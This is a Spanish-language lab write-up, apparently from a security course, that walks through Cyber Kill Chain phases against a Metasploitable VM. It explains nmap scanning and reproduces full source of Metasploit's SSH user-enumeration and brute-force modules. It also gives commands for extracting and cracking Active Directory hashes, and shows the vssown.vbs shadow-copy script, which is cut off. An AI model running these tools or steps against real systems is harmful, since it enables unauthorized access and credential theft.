---
title: (M.IET-CS) P01 - Kill Chain
date: 2024-10-09 20:15:00 -05:00
categories: [killchain, pentesting]
tags: [nmap, kali, metasploit]
---

<!-- Se desarrolla el laboratorio utilizando Máquinas virtualizadas mediante Virtual-Box. Se cuenta con un Kali y un Metasploitable virtualizados. -->

## **Fases del Kill-Chain**

<!-- Pasos típicos del Kill Chain:
- **Reconnaissance**: Profundizamos en el escaneo con Nmap
- **Weaponization**: usamos dos módulos de metasploit (Kali Linux), enumeración de usuarios SSH, y obtención de contraseñas de los usuarios encontrados.
- **Delivery / Exploitation**: acceso vía SSH a la máquina Metasploitable.
- **Installation**: ejecución del script para el dumping de los archivos SAM y SYSTEM
- **Actions on Object**: Data exfiltration de los archivos SAM y SYSTEM, y posterior extracción de la información contenida en dichos archivos.
 -->

Las diferentes fases pueden ser representadas en el siguiente diagrama tomado de Yadav et. al. (2015)

![Kill-Chain](/assets/images/phases_kill_chain.png){: .left }

Mayor de detalle de la información obtenida, puede consultarse en:
> @inproceedings{inproceedings,
author = {Yadav, Tarun and Rao, Arvind},
year = {2015},
month = {08},
pages = {},
title = {Technical Aspects of Cyber Kill Chain},
isbn = {978-3-319-22914-0},
doi = {10.1007/978-3-319-22915-7_40}
}
{: .prompt-info }


## **Reconnaissance**
Reconnaissance es la fase inicial en el proceso de ataque cibernético, donde se recopila información sobre un objetivo potencial, que puede ser un individuo o una entidad organizacional. Este proceso se divide en dos tipos:

* Reconocimiento Pasivo: Se lleva a cabo sin alertar al objetivo, utilizando métodos como consultas de dominio, registros WHOIS y recopilación de datos de redes sociales y documentos públicos.
* Reconocimiento Activo: Involucra técnicas más intrusivas, como barridos de ping, fingerprinting y escaneo de puertos, que pueden generar alertas en el objetivo.

El reconocimiento ayuda a los atacantes a identificar y perfilar a sus objetivos, lo que les permite elegir las herramientas y métodos de ataque más adecuados, así como planificar la entrega de malware y evadir mecanismos de seguridad. La información recopilada en esta etapa es crucial para diseñar y ejecutar el ataque de manera efectiva.


### 1. ¿Por qué debemos ejecutar nmap con privilegios de root?
Ejecutar Nmap con privilegios de root permite realizar escaneos más avanzados y detallados. Por ejemplo, se pueden llevar a cabo escaneos de tipo SYN (stealth), que requieren acceso a sockets en modo RAW, así como la posibilidad de enviar paquetes personalizados. Sin privilegios de root, algunas funciones de escaneo estarán limitadas.

#### Ejecución de Nmap con Privilegios de Root
**Acceso a funciones avanzadas**:
- *Escaneo SYN (stealth)*: Este tipo de escaneo, que se activa con el flag -sS, requiere enviar paquetes en modo RAW. Al hacerlo, Nmap solo envía el paquete SYN y espera la respuesta, sin completar el handshake TCP. Esto permite al escáner identificar puertos abiertos sin establecer una conexión completa, lo que reduce la probabilidad de detección por sistemas de monitoreo de seguridad.
- *Escaneo de Puertos UDP*: El escaneo UDP (-sU) también puede requerir privilegios elevados para enviar y recibir ciertos tipos de paquetes.

**Detección de Sistemas Operativos**:
La detección de sistema operativo (-O) se basa en la observación de las respuestas de los paquetes y puede requerir el envío de paquetes RAW, que necesitan permisos de root para ejecutarse.

**Uso de Sockets en Modo RAW**:
Sin privilegios de root, Nmap no puede utilizar sockets en modo RAW, lo que limita su capacidad para enviar y recibir ciertos tipos de paquetes. Esto afecta tanto la eficacia del escaneo como la calidad de la información recopilada.

**Mayor Control sobre los Paquetes**:
Al ejecutar Nmap como root, puedes personalizar aún más el comportamiento de los paquetes que envías, lo que es útil para simular diferentes tipos de ataques o pruebas de penetración.

#### Limitaciones sin Privilegios de Root:
Sin los permisos adecuados, Nmap no podrá realizar escaneos que dependan de la manipulación de paquetes a nivel de red, lo que puede resultar en una falta de información crucial sobre el objetivo o en escaneos incompletos.


### 2. ¿Qué significan los flags -sS, -sT, -sV, -O en el escaneo de nmap?
- **-sS**: Realiza un escaneo SYN (half-open), enviando un paquete SYN y analizando la respuesta sin completar la conexión, lo que lo hace más sigiloso.
- **-sT**: Realiza un escaneo TCP completo (full-connect), estableciendo la conexión completa (SYN, SYN-ACK, ACK), que es más fácil de detectar.
- **-sV**: Intenta identificar la versión del servicio que está corriendo en el puerto abierto, proporcionando información más detallada sobre las aplicaciones.
- **-O**: Detecta el sistema operativo del objetivo analizando las respuestas de los paquetes, lo que ayuda a identificar vulnerabilidades específicas.

> https://nmap.org/book/
{: .prompt-info }

### 3. ¿Existe algún flag que permite hacer un escaneo involucrando todos los flags mencionados anteriormente?
Se puede usar la opción -A que habilita la detección de versión, la detección del sistema operativo, y el escaneo de scripts de Nmap. Alternativamente, se puede combinar flags específicos como -sS -sV -O en un solo comando.


### 4. Explicar el proceso de un handshake TCP.
El proceso de un handshake TCP se realiza en tres pasos, tal como se muestra en la imagen tomada del libro de Hunt (2003):

![Kill-Chain](/assets/images/handshake-tcpip.png){: .left w="480" h="300"}

- **SYN**: El cliente envía un paquete SYN al servidor para iniciar la conexión.
- **SYN-ACK**: El servidor responde con un paquete SYN-ACK, reconociendo la solicitud del cliente y enviando su propia solicitud de conexión.
- **ACK**: El cliente envía un paquete ACK al servidor, completando el proceso de establecimiento de conexión. A partir de este punto, la comunicación puede comenzar.

Más información se puede consultar el post de Microsoft: [three-way-handshake-via-tcpip](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/three-way-handshake-via-tcpip), o en el libro:

> @incollection{HUNT2003489,
title = {Transmission Control Protocol/Internet Protocol (TCP/IP)},
editor = {Hossein Bidgoli},
booktitle = {Encyclopedia of Information Systems},
publisher = {Elsevier},
address = {New York},
pages = {489-510},
year = {2003},
isbn = {978-0-12-227240-0},
doi = {https://doi.org/10.1016/B0-12-227240-4/00187-8},
url = {https://www.sciencedirect.com/science/article/pii/B0122272404001878},
author = {Ray Hunt}
}
{: .prompt-info }


### 5. Según la pregunta anterior, ¿qué significa el flag -sS?
El flag -sS en Nmap indica un escaneo SYN (stealth), donde Nmap envía un paquete SYN para iniciar la conexión pero no completa el handshake. Esto permite al atacante detectar puertos abiertos sin establecer una conexión completa, lo que lo hace menos detectable por sistemas de seguridad.


### 6. ¿Qué hace el flag --script?
El flag --script permite ejecutar scripts de Nmap Scripting Engine (NSE) que pueden realizar diversas tareas como escaneo de vulnerabilidades, detección de servicios y recopilación de información adicional. Los scripts pueden ser específicos para ciertos protocolos, lo que amplía considerablemente las capacidades de Nmap.



## **Weaponization**
La fase de Weaponization en la cadena de ataque cibernético se centra en diseñar un acceso no autorizado (backdoor) y un plan de penetración, utilizando la información recopilada en la fase de reconocimiento. Esta etapa implica la creación de un Remote Access Tool (RAT), que permite al atacante acceder de forma remota y oculta al sistema de la víctima.


### 7. Script utilizado en la enumeración de usuarios SSH (auxiliary/scanner/ssh/ssh_enumusers).

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
include Msf::Exploit::Remote::SSH
include Msf::Auxiliary::Scanner
include Msf::Auxiliary::Report

def initialize(info = {})
    super(
    update_info(
        info,
        'Name' => 'SSH Username Enumeration',
        'Description' => %q{
        This module uses a malformed packet or timing attack to enumerate users on
        an OpenSSH server.

        The default action sends a malformed (corrupted) SSH_MSG_USERAUTH_REQUEST
        packet using public key authentication (must be enabled) to enumerate users.

        On some versions of OpenSSH under some configurations, OpenSSH will return a
        "permission denied" error for an invalid user faster than for a valid user,
        creating an opportunity for a timing attack to enumerate users.

        Testing note: invalid users were logged, while valid users were not. YMMV.
        },
        'Author' => [
        'kenkeiras',     # Timing attack
        'Dariusz Tytko', # Malformed packet
        'Michal Sajdak', # Malformed packet
        'Qualys',        # Malformed packet
        'wvu'            # Malformed packet
        ],
        'References' => [
        ['CVE', '2003-0190'],
        ['CVE', '2006-5229'],
        ['CVE', '2016-6210'],
        ['CVE', '2018-15473'],
        ['OSVDB', '32721'],
        ['BID', '20418'],
        ['URL', 'https://seclists.org/oss-sec/2018/q3/124'],
        ['URL', 'https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/']
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
        [
            'Malformed Packet',
            {
            'Description' => 'Use a malformed packet',
            'Type' => :malformed_packet
            }
        ],
        [
            'Timing Attack',
            {
            'Description' => 'Use a timing attack',
            'Type' => :timing_attack
            }
        ]
        ],
        'DefaultAction' => 'Malformed Packet',
        'Notes' => {
        'Stability' => [
            CRASH_SERVICE_DOWN # possible that a malformed packet may crash the service
        ],
        'Reliability' => [],
        'SideEffects' => [
            IOC_IN_LOGS,
            ACCOUNT_LOCKOUTS, # timing attack submits a password
        ]
        }
    )
    )

    register_options(
    [
        Opt::Proxies,
        Opt::RPORT(22),
        OptString.new('USERNAME',
                    [false, 'Single username to test (username spray)']),
        OptPath.new('USER_FILE',
                    [false, 'File containing usernames, one per line']),
        OptBool.new('DB_ALL_USERS',
                    [false, 'Add all users in the current database to the list', false]),
        OptInt.new('THRESHOLD',
                [
                    true,
                    'Amount of seconds needed before a user is considered ' \
                    'found (timing attack only)', 10
                ]),
        OptBool.new('CHECK_FALSE',
                    [false, 'Check for false positives (random username)', true])
    ]
    )

    register_advanced_options(
    [
        OptInt.new('RETRY_NUM',
                [
                    true, 'The number of attempts to connect to a SSH server' \
                ' for each user', 3
                ]),
        OptInt.new('SSH_TIMEOUT',
                [
                    false, 'Specify the maximum time to negotiate a SSH session',
                    10
                ]),
        OptBool.new('SSH_DEBUG',
                    [
                    false, 'Enable SSH debugging output (Extreme verbosity!)',
                    false
                    ])
    ]
    )
end

def rport
    datastore['RPORT']
end

def retry_num
    datastore['RETRY_NUM']
end

def threshold
    datastore['THRESHOLD']
end

# Returns true if a nonsense username appears active.
def check_false_positive(ip)
    user = Rex::Text.rand_text_alphanumeric(8..32)
    attempt_user(user, ip) == :success
end

def check_user(ip, user, port)
    technique = action['Type']

    opts = ssh_client_defaults.merge({
    port: port
    })

    # The auth method is converted into a class name for instantiation,
    # so malformed-packet here becomes MalformedPacket from the mixin
    case technique
    when :malformed_packet
    opts.merge!(auth_methods: ['malformed-packet'])
    when :timing_attack
    opts.merge!(
        auth_methods: ['password', 'keyboard-interactive'],
        password: rand_pass
    )
    end

    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    start_time = Time.new

    begin
    ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, user, opts)
    end
    rescue Rex::ConnectionError
    return :connection_error
    rescue Timeout::Error
    return :success if technique == :timing_attack
    rescue Net::SSH::AuthenticationFailed
    return :fail if technique == :malformed_packet
    rescue Net::SSH::Exception => e
    vprint_error("#{e.class}: #{e.message}")
    end

    finish_time = Time.new

    case technique
    when :malformed_packet
    return :success if ssh
    when :timing_attack
    return :success if (finish_time - start_time > threshold)
    end

    :fail
end

def rand_pass
    Rex::Text.rand_text_english(64_000..65_000)
end

def do_report(ip, user, _port)
    service_data = {
    address: ip,
    port: rport,
    service_name: 'ssh',
    protocol: 'tcp',
    workspace_id: myworkspace_id
    }

    credential_data = {
    origin_type: :service,
    module_fullname: fullname,
    username: user
    }.merge(service_data)

    login_data = {
    core: create_credential(credential_data),
    status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
end

# Because this isn't using the AuthBrute mixin, we don't have the
# usual peer method
def peer(rhost = nil)
    "#{rhost}:#{rport} - SSH -"
end

def user_list
    users = []

    users << datastore['USERNAME'] unless datastore['USERNAME'].blank?

    if datastore['USER_FILE']
    fail_with(Failure::BadConfig, 'The USER_FILE is not readable') unless File.readable?(datastore['USER_FILE'])
    users += File.read(datastore['USER_FILE']).split
    end

    if datastore['DB_ALL_USERS']
    if framework.db.active
        framework.db.creds(workspace: myworkspace.name).each do |o|
        users << o.public.username if o.public
        end
    else
        print_warning('No active DB -- The following option will be ignored: DB_ALL_USERS')
    end
    end

    users.uniq
end

def attempt_user(user, ip)
    attempt_num = 0
    ret = nil

    while (attempt_num <= retry_num) && (ret.nil? || (ret == :connection_error))
    if attempt_num > 0
        Rex.sleep(2**attempt_num)
        vprint_status("#{peer(ip)} Retrying '#{user}' due to connection error")
    end

    ret = check_user(ip, user, rport)
    attempt_num += 1
    end

    ret
end

def show_result(attempt_result, user, ip)
    case attempt_result
    when :success
    print_good("#{peer(ip)} User '#{user}' found")
    do_report(ip, user, rport)
    when :connection_error
    vprint_error("#{peer(ip)} User '#{user}' could not connect")
    when :fail
    vprint_error("#{peer(ip)} User '#{user}' not found")
    end
end

def run
    if user_list.empty?
    fail_with(Failure::BadConfig, 'Please populate DB_ALL_USERS, USER_FILE, USERNAME')
    end

    super
end

def run_host(ip)
    print_status("#{peer(ip)} Using #{action.name.downcase} technique")

    if datastore['CHECK_FALSE']
    print_status("#{peer(ip)} Checking for false positives")
    if check_false_positive(ip)
        print_error("#{peer(ip)} throws false positive results. Aborting.")
        return
    end
    end

    users = user_list

    print_status("#{peer(ip)} Starting scan")
    users.each { |user| show_result(attempt_user(user, ip), user, ip) }
end
end
```

#### ¿En qué lenguaje de programación está hecho?
El script está escrito en *Ruby*, que es el lenguaje utilizado para la mayoría de los módulos de Metasploit.


### 8. Descripción breve del funcionamiento de *ssh_enumusers*. 
El script ssh_enumusers se utiliza para enumerar usuarios válidos en un servidor SSH. Funciona enviando intentos de autenticación a través de SSH con nombres de usuario proporcionados y registrando las respuestas del servidor. El script puede usar una lista de nombres de usuario o una palabra clave para identificar cuáles son válidos. Si el servidor responde con un mensaje que indica que el nombre de usuario es válido (por ejemplo, un mensaje de "Authentication failed" que se diferencia entre usuarios no válidos y válidos), el script puede determinar que ese nombre de usuario existe en el sistema.


### 9. Script utilizado en la obtención de los passwords de los usuarios SSH (auxiliary/scanner/ssh/ssh_login).

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'
require 'net/ssh/command_stream'
require 'metasploit/framework/login_scanner/ssh'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
include Msf::Auxiliary::AuthBrute
include Msf::Auxiliary::Report
include Msf::Auxiliary::CommandShell
include Msf::Auxiliary::Scanner
include Msf::Exploit::Remote::SSH::Options
include Msf::Sessions::CreateSessionOptions
include Msf::Auxiliary::ReportSummary

def initialize
    super(
    'Name'           => 'SSH Login Check Scanner',
    'Description'    => %q{
        This module will test ssh logins on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
    },
    'Author'         => ['todb'],
    'References'     =>
        [
        [ 'CVE', '1999-0502'] # Weak password
        ],
    'License'        => MSF_LICENSE,
    'DefaultOptions' => {'VERBOSE' => false} # Disable annoying connect errors
    )

    register_options(
    [
        Opt::RPORT(22)
    ], self.class
    )

    register_advanced_options(
    [
        Opt::Proxies,
        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30]),
        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', true])
    ]
    )
end

def rport
    datastore['RPORT']
end

def session_setup(result, scanner)
    return unless scanner.ssh_socket

    platform = scanner.get_platform(result.proof)

    # Create a new session
    sess = Msf::Sessions::SshCommandShellBind.new(scanner.ssh_socket)

    merge_me = {
    'USERPASS_FILE' => nil,
    'USER_FILE'     => nil,
    'PASS_FILE'     => nil,
    'USERNAME'      => result.credential.public,
    'PASSWORD'      => result.credential.private
    }
    s = start_session(self, nil, merge_me, false, sess.rstream, sess)
    self.sockets.delete(scanner.ssh_socket.transport.socket)

    # Set the session platform
    s.platform = platform

    # Create database host information
    host_info = {host: scanner.host}

    unless s.platform == 'unknown'
    host_info[:os_name] = s.platform
    end

    report_host(host_info)

    s
end


def run_host(ip)
    @ip = ip
    print_brute :ip => ip, :msg => 'Starting bruteforce'

    cred_collection = build_credential_collection(
    username: datastore['USERNAME'],
    password: datastore['PASSWORD'],
    )

    scanner = Metasploit::Framework::LoginScanner::SSH.new(
    configure_login_scanner(
        host: ip,
        port: rport,
        cred_details: cred_collection,
        proxies: datastore['Proxies'],
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['SSH_TIMEOUT'],
        framework: framework,
        framework_module: self,
        skip_gather_proof: !datastore['GatherProof']
    )
    )

    scanner.verbosity = :debug if datastore['SSH_DEBUG']

    scanner.scan! do |result|
    credential_data = result.to_h
    credential_data.merge!(
        module_fullname: self.fullname,
        workspace_id: myworkspace_id
    )
    case result.status
    when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
        credential_data[:private_type] = :password
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        if datastore['CreateSession']
        begin
            session_setup(result, scanner)
        rescue StandardError => e
            elog('Failed to setup the session', error: e)
            print_brute :level => :error, :ip => ip, :msg => "Failed to setup the session - #{e.class} #{e.message}"
        end
        end

        if datastore['GatherProof'] && scanner.get_platform(result.proof) == 'unknown'
        msg = "While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with"
        msg << " 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with"
        msg << " device details so it can be handled in the future."
        print_brute :level => :error, :ip => ip, :msg => msg
        end
        :next_user
    when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        invalidate_login(credential_data)
        :abort
    when Metasploit::Model::Login::Status::INCORRECT
        vprint_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        invalidate_login(credential_data)
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
    else
        invalidate_login(credential_data)
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
    end
    end
end
end
```

#### ¿En qué lenguaje de programación está hecho?
Este script también está escrito en *Ruby*.

### 10. Descripción breve del funcionamiento de *ssh_login*. 
El script *ssh_login* se utiliza para realizar ataques de fuerza bruta en servidores SSH, intentando autenticar con combinaciones de nombres de usuario y contraseñas. El usuario puede proporcionar listas de credenciales (nombres de usuario y contraseñas), y el script intenta cada combinación. Si se realiza un inicio de sesión exitoso, el script puede reportar las credenciales válidas. Este script es útil para probar la seguridad de las configuraciones de SSH y detectar contraseñas débiles que puedan ser explotadas.



## **Delivery / Explotation**
La fase de Delivery en la cadena de ataque cibernético es crucial para el éxito de un ataque. Esta etapa se encarga de la transmisión del "arma" (el malware o el acceso no autorizado) al objetivo, y es fundamental contar con información del objetivo obtenida en las fases de reconocimiento.

La fase de explotación ocurre inmediatamente después de que se ha entregado el arma cibernética y el usuario realiza la interacción necesaria, permitiendo que el malware se ejecute en el sistema del objetivo. El objetivo principal de esta etapa es instalar o ejecutar el payload de forma silenciosa y sin ser detectado.

<!-- Aspectos Clave de la Explotación:
- Condiciones Necesarias: Para que un exploit funcione, deben cumplirse ciertas condiciones:
    El usuario debe estar utilizando el software o sistema operativo específico para el cual se diseñó el exploit.
    El software o sistema operativo no debe estar actualizado a versiones donde el exploit no funcione.
    Los mecanismos de seguridad, como antivirus, no deben detectar el exploit ni el payload durante el análisis estático o dinámico.
- Activación del Exploit: Si se cumplen estas condiciones, el exploit se activa y logra instalar o ejecutar el payload en el sistema del objetivo.

- Conexión con el Controlador: Una vez que el payload se ejecuta, establece una conexión con el servidor de Comando y Control (C&C) del atacante, informando sobre su ejecución exitosa y esperando recibir más instrucciones. -->


## **Installation**
La instalación de malware sigue a la explotación y requiere cumplir tres condiciones, **Compatibilidad**: El software o sistema operativo debe ser vulnerable. **Versiones Antiguas**: No debe estar actualizado a versiones donde el exploit no funcione. **Evasión de Seguridad**: Los antivirus no deben detectar el exploit ni el payload.
Si se cumplen, el exploit se activa, instalando el payload que se conecta al servidor de Comando y Control para recibir instrucciones.
Los exploits se basan en vulnerabilidades de software, identificadas como CVE. El fuzzing se utiliza para descubrir estas vulnerabilidades. El malware moderno utiliza técnicas avanzadas, como droppers y downloaders, para instalarse y actualizarse en los dispositivos de las víctimas.

Link: [Charla "Lurking in the Shadows" de Tim Tomes y Mark Baggett](https://www.youtube.com/watch?v=ant3ir9cRME)

{% include embed/youtube.html id='ant3ir9cRME' %}

### 11. Proporcionar un breve resumen sobre cómo se puede conciliar malware.

- **Análisis de Comportamiento**: En lugar de solo confiar en firmas de antivirus, se recomienda observar el comportamiento del software. Identificar actividades inusuales, como cambios inesperados en el sistema o comunicaciones salientes, puede ayudar a detectar malware.

- **Sandboxing**: Utilizar entornos seguros (sandbox) para ejecutar y analizar archivos sospechosos sin riesgo de comprometer el sistema. Esto permite observar cómo el software se comporta y qué cambios realiza en el entorno.

- **Recolección de Indicadores**: Identificar y documentar indicadores asociados con el malware conocido para facilitar la detección y respuesta en futuros incidentes.

- **Educación y Capacitación**: Capacitar a los empleados sobre las amenazas de malware y las mejores prácticas de seguridad, lo que puede ayudar a prevenir la introducción de malware en la red.

- **Actualizaciones y Parcheo**: Mantener sistemas y aplicaciones actualizados para protegerse contra vulnerabilidades conocidas que el malware podría explotar.

- **Respuesta a Incidentes**: Tener un plan de respuesta a incidentes bien definido que incluya la identificación, contención, erradicación y recuperación de un ataque de malware.


### 12. ¿Cómo se puede recuperar hashes con el script vssown.vbs?
A partir de los Blogs:
- [Blog-shadow_copies_from_python](https://www.sans.org/blog/using-volume-shadow-copies-from-python/),

- [Blog-recovering_hashes_from_domain_controller](https://hackfest.ca/en/blog/2011/recovering-hashes-from-domain-controller),

Para recuperar hashes utilizando el script *vssown.vbs*

1. Instalar Herramientas para Extraer Hashes
Herramienta de Csaba Barta: Descargar e instalar la herramienta de Barta para analizar archivos de interés como el archivo ntds.dit. Asegurarse que esté configurado y compilado correctamente en el entorno.
2. Extraer Hashes
   - Ejecutar la Herramienta: Navegar a la carpeta de la herramienta y ejecutar el comando para procesar el archivo ntds.dit, se utiliza el comando:
   ```bash
   ./esedbdump /ruta/donde/guardaste/ntds.dit
   ```
   - Generar el Archivo de Exportación: Esto generará una carpeta ntds.dit.export que contendrá un archivo llamado datatable.

3. Dump de Hashes
Uso de dsdump.py: Navegar a la carpeta creddump y ejecuta el script dsdump.py con la ruta al archivo datatable:
bash
```bash
python dsdump.py /ruta/a/ntds.dit.export/datatable
```
4. Cracking de Hashes
- Preparar para Hashcat: Guardar la salida en un formato que Hashcat pueda procesar. Asegurarse que los hashes estén en el formato correcto para el cracker.
- Ejecutar Hashcat: Usar Hashcat para intentar crackear los hashes obtenidos.


### 13. Proporcionar explicación sobre el código de vssown.vbs.

```vb
REM Volume Shadow Copy Management from CLI.
REM Part of the presentation "Lurking in the Shadows" by Mark Baggett and Tim "LaNMaSteR53" Tomes.
REM Co-developed by Mark Baggett (@MarkBaggett) and Tim Tomes (@lanmaster53).

Set args = WScript.Arguments

if args.Count < 1  Then
  wscript.Echo "Usage: cscript vssown.vbs [option]"
  wscript.Echo
  wscript.Echo "  Options:"
  wscript.Echo
  wscript.Echo "  /list                             - List current volume shadow copies."
  wscript.Echo "  /start                            - Start the shadow copy service."
  wscript.Echo "  /stop                             - Halt the shadow copy service."
  wscript.Echo "  /status                           - Show status of shadow copy service."
  wscript.Echo "  /mode                             - Display the shadow copy service start mode."
  wscript.Echo "  /mode [Manual|Automatic|Disabled] - Change the shadow copy service start mode."
  wscript.Echo "  /create [drive_letter]            - Create a shadow copy."
  wscript.Echo "  /delete [id|*]                    - Delete a specified or all shadow copies."
  wscript.Echo "  /mount [path] [device_object]     - Mount a shadow copy to the given path."
  wscript.Echo "  /execute [\path\to\file]          - Launch executable from within an umounted shadow copy."
  wscript.Echo "  /store                            - Display storage statistics."
  wscript.Echo "  /size [bytes]                     - Set drive space reserved for shadow copies."
  REM build_off
  wscript.Echo "  /build [filename]                 - Print pasteable script to stdout."REM no_build
  REM build_on
  wscript.Quit(0)
End If

strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

Select Case args.Item(0)

  Case "/list"
    Wscript.Echo "SHADOW COPIES"
    Wscript.Echo "============="
    Wscript.Echo
    Set colItems = objWMIService.ExecQuery("Select * from Win32_ShadowCopy")
    For Each objItem in colItems
      Wscript.Echo "[*] ID:                  " & objItem.ID
      Wscript.Echo "[*] Client accessible:   " & objItem.ClientAccessible
      Wscript.Echo "[*] Count:               " & objItem.Count
      Wscript.Echo "[*] Device object:       " & objItem.DeviceObject
      Wscript.Echo "[*] Differential:        " & objItem.Differential
      Wscript.Echo "[*] Exposed locally:     " & objItem.ExposedLocally
      Wscript.Echo "[*] Exposed name:        " & objItem.ExposedName
      Wscript.Echo "[*] Exposed remotely:    " & objItem.ExposedRemotely
      Wscript.Echo "[*] Hardware assisted:   " & objItem.HardwareAssisted
      Wscript.Echo "[*] Imported:            " & objItem.Imported
      Wscript.Echo "[*] No auto release:     " & objItem.NoAutoRelease
      Wscript.Echo "[*] Not surfaced:        " & objItem.NotSurfaced
      Wscript.Echo "[*] No writers:          " & objItem.NoWriters
      Wscript.Echo "[*] Originating machine: " & objItem.OriginatingMachine
      Wscript.Echo "[*] Persistent:          " & objItem.Persistent
      Wscript.Echo "[*] Plex:                " & objItem.Plex
      Wscript.Echo "[*] Provider ID:         " & objItem.ProviderID
      Wscript.Echo "[*] Service machine:     " & objItem.ServiceMachine
      Wscript.Echo "[*] Set ID:              " & objItem.SetID
      Wscript.Echo "[*] State:               " & objItem.State
      Wscript.Echo "[*] Transportable:       " & objItem.Transportable
      Wscript.Echo "[*] Volume name:         " & objItem.VolumeName
      Wscript.Echo
    Next
    wscript.Quit(0)

  Case "/start"
    Set colListOfServices = objWMIService.ExecQuery("Select * from Win32_Service Where Name ='VSS'")
    For Each objService in colListOfServices
      objService.StartService()
      Wscript.Echo "[*] Signal sent to start the " & objService.Name & " service."
    Next
    wscript.Quit(0)

  Case "/stop"
    Set colListOfServices = objWMIService.ExecQuery("Select * from Win32_Service Where Name ='VSS'")
    For Each objService in colListOfServices
      objService.StopService()
      Wscript.Echo "[*] Signal sent to stop the " & objService.Name & " service."
    Next
    wscript.Quit(0)

  Case "/status"
    Set colListOfServices = objWMIService.ExecQuery("Select * from Win32_Service Where Name ='VSS'")
    For Each objService in colListOfServices
      Wscript.Echo "[*] " & objService.State
    Next
    wscript.Quit(0)

  Case "/mode"
    Set colListOfServices = objWMIService.ExecQuery("Select * from Win32_Service Where Name ='VSS'")
    For Each objService in colListOfServices
      if args.Count < 2 Then
        Wscript.Echo "[*] " & objService.Name & " service set to '" & objService.StartMode & "' start mode."        
      Else
        mode = LCase(args.Item(1))
        if mode = "manual" or mode = "automatic" or mode = "disabled" Then
          errResult = objService.ChangeStartMode(mode)
          Wscript.Echo "[*] " & objService.Name & " service set to '" & mode & "' start mode."
        Else
          Wscript.Echo "[*] '" & mode & "' is not a valid start mode."
        End If
      END If
    Next
    wscript.Quit(errResult)    

  Case "/create"
    VOLUME = args.Item(1) & ":\"
    Const CONTEXT = "ClientAccessible"
    Set objShadowStorage = objWMIService.Get("Win32_ShadowCopy")
    Wscript.Echo "[*] Attempting to create a shadow copy."
    errResult = objShadowStorage.Create(VOLUME, CONTEXT, strShadowID)
    wscript.Quit(errResult)

  Case "/delete"
    id = args.Item(1)
    Set colItems = objWMIService.ExecQuery("Select * From Win32_ShadowCopy")
    For Each objItem in colItems
      if objItem.ID = id Then
        Wscript.Echo "[*] Attempting to delete shadow copy with ID: " & id
        errResult = objItem.Delete_
      ElseIf id = "*" Then
        Wscript.Echo "[*] Attempting to delete shadow copy " & objItem.DeviceObject & "."
        errResult = objItem.Delete_
      End If
    Next
    wscript.Quit(errResult)

  Case "/mount"
    Set WshShell = WScript.CreateObject("WScript.Shell")
    link = args.Item(1)
    sc = args.Item(2) & "\"
    cmd = "cmd /C mklink /D " & link & " " & sc
    WshShell.Run cmd, 2, true
    Wscript.Echo "[*] " & sc & " has been mounted to " & link & "."
    wscript.Quit(0)

  Case "/execute"
    file = args.Item(1)
    Set colItems = objWMIService.ExecQuery("Select * From Win32_ShadowCopy")
    Set objProcess = objWMIService.Get("Win32_Process")
    For Each objItem in colItems
      path = Replace(objItem.DeviceObject,"?",".") & file
      intReturn = objProcess.Create(path)
      if intReturn <> 0 Then
        wscript.Echo "[*] Process could not be created from " & path & "."
        wscript.Echo "[*] ReturnValue = " & intReturn
      Else
        wscript.Echo "[!] Process created from " & path & "."
        wscript.Quit(0)
      End If
    Next
    wscript.Quit(0)

  Case "/store"
    Wscript.Echo "SHADOW STORAGE"
    Wscript.Echo "=============="
    Wscript.Echo
    Set colItems = objWMIService.ExecQuery("Select * from Win32_ShadowStorage")
    For Each objItem in colItems
        Wscript.Echo "[*] Allocated space:     " & FormatNumber(objItem.AllocatedSpace / 1000000,0) & "MB"
        Wscript.Echo "[*] Maximum size:        " & FormatNumber(objItem.MaxSpace / 1000000,0) & "MB"
        Wscript.Echo "[*] Used space:          " & FormatNumber(objItem.UsedSpace / 1000000,0) & "MB"
        Wscript.Echo
    Next
    wscript.Quit(0)

  Case "/size"
    storagesize = CDbl(args.Item(1))
    Set colItems = objWMIService.ExecQuery("Select * from Win32_ShadowStorage")
    For Each objItem in colItems
      objItem.MaxSpace = storagesize
      objItem.Put_
    Next
    Wscript.Echo "[*] Shadow storage space has been set to " & FormatNumber(storagesize / 1000000,0) & "MB."
    wscript.Quit(0)

  REM build_off
  Case "/build"
    build = 1
    Const ForReading = 1
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objTextFile = objFSO.OpenTextFile("vssown.vbs", ForReading)
